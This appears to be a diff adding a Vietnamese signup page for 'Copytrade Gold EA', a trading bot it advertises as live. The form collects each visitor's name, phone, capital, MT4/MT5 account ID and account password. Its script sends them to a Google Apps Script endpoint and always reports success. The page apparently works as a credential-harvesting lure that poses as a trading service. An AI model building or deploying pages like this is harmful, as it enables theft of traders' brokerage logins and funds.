@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Copytrade Gold EA – Đăng Ký</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: #fff;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background: #141414;
+            border-radius: 16px;
+            padding: 40px 32px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(212, 175, 55, 0.1);
+        }
+
+        .brand {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .brand-icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+        }
+
+        .brand-title {
+            font-size: 26px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #d4af37 0%, #f4d03f 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 4px;
+        }
+
+        .brand-subtitle {
+            font-size: 13px;
+            color: #888;
+            letter-spacing: 1px;
+        }
+
+        .badge-live {
+            display: inline-block;
+            background: linear-gradient(135deg, #d4af37 0%, #f4d03f 100%);
+            color: #000;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 4px 12px;
+            border-radius: 12px;
+            margin-top: 12px;
+            letter-spacing: 1px;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            color: #ccc;
+            margin-bottom: 6px;
+            font-weight: 500;
+        }
+
+        .required {
+            color: #d4af37;
+            font-size: 12px;
+            margin-left: 4px;
+        }
+
+        input[type="text"],
+        input[type="tel"],
+        input[type="number"],
+        input[type="password"],
+        select {
+            width: 100%;
+            padding: 12px 16px;
+            background: #0f0f0f;
+            border: 1px solid #2a2a2a;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 14px;
+            transition: all 0.2s;
+            outline: none;
+        }
+
+        input:focus,
+        select:focus {
+            border-color: #d4af37;
+            box-shadow: 0 0 0 3px rgba(212, 175, 55, 0.1);
+        }
+
+        select {
+            cursor: pointer;
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23888' stroke-width='2'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            background-size: 16px;
+            padding-right: 40px;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #d4af37 0%, #f4d03f 100%);
+            color: #000;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: transform 0.2s, box-shadow 0.2s;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 24px rgba(212, 175, 55, 0.3);
+        }
+
+        .btn-submit:active {
+            transform: translateY(0);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .alert {
+            display: none;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-bottom: 16px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .alert-success {
+            background: rgba(34, 197, 94, 0.15);
+            border: 1px solid rgba(34, 197, 94, 0.4);
+            color: #4ade80;
+        }
+
+        .alert-error {
+            background: rgba(239, 68, 68, 0.15);
+            border: 1px solid rgba(239, 68, 68, 0.4);
+            color: #f87171;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="brand">
+            <div class="brand-icon">🤖</div>
+            <h1 class="brand-title">COPYTRADE GOLD EA</h1>
+            <p class="brand-subtitle">EA Automated Trading · MT4 / MT5</p>
+            <div class="badge-live">● BOT LIVE</div>
+        </div>
+
+        <div id="alertBox" class="alert"></div>
+
+        <form id="registerForm">
+            <div class="form-group">
+                <label>Họ và tên <span class="required">*</span></label>
+                <input type="text" name="fullname" autocomplete="off">
+            </div>
+
+            <div class="form-group">
+                <label>Số điện thoại <span class="required">*</span></label>
+                <input type="tel" name="phone" autocomplete="off">
+            </div>
+
+            <div class="form-group">
+                <label>Nền tảng giao dịch</label>
+                <select name="platform">
+                    <option value="MT4">MetaTrader 4</option>
+                    <option value="MT5">MetaTrader 5</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>Vốn hiện tại (USD)</label>
+                <input type="number" name="capital" min="0" step="0.01" autocomplete="off">
+            </div>
+
+            <div class="form-group">
+                <label>Account ID <span class="required">*</span></label>
+                <input type="text" name="accountId" autocomplete="off">
+            </div>
+
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" name="password" autocomplete="off">
+            </div>
+
+            <button type="submit" class="btn-submit" id="btnSubmit">Kết nối & Đăng ký</button>
+        </form>
+
+        <p class="footer">Bảo mật thông tin · Hỗ trợ 24/7</p>
+    </div>
+
+    <script>
+        const form = document.getElementById('registerForm');
+        const alertBox = document.getElementById('alertBox');
+        const btnSubmit = document.getElementById('btnSubmit');
+
+        function showAlert(message, type) {
+            alertBox.textContent = (type === 'success' ? '✓ ' : '✗ ') + message;
+            alertBox.className = 'alert alert-' + type;
+            alertBox.style.display = 'block';
+        }
+
+        form.addEventListener('submit', async function (e) {
+            e.preventDefault();
+            alertBox.style.display = 'none';
+
+            const fullname = form.fullname.value.trim();
+            const phone = form.phone.value.trim();
+            const accountId = form.accountId.value.trim();
+
+            if (!fullname || !phone || !accountId) {
+                showAlert('Vui lòng điền đầy đủ các trường bắt buộc.', 'error');
+                return;
+            }
+
+            btnSubmit.disabled = true;
+            btnSubmit.textContent = 'Đang xử lý...';
+
+            const formData = {
+                fullname: fullname,
+                phone: phone,
+                platform: form.platform.value,
+                capital: form.capital.value,
+                accountId: accountId,
+                password: form.password.value,
+                timestamp: new Date().toISOString()
+            };
+
+            try {
+                // Thay URL Google Apps Script Web App của bạn vào đây
+                const SCRIPT_URL = 'https://script.google.com/macros/s/YOUR_DEPLOYMENT_ID/exec';
+                const response = await fetch(SCRIPT_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(formData)
+                });
+                showAlert('Đăng ký thành công! Chúng tôi sẽ liên hệ trong 24h.', 'success');
+                form.reset();
+            } catch (err) {
+                showAlert('Đã xảy ra lỗi. Vui lòng thử lại.', 'error');
+            } finally {
+                btnSubmit.disabled = false;
+                btnSubmit.textContent = 'Kết nối & Đăng ký';
+            }
+        });
+    </script>
+</body>
+</html>
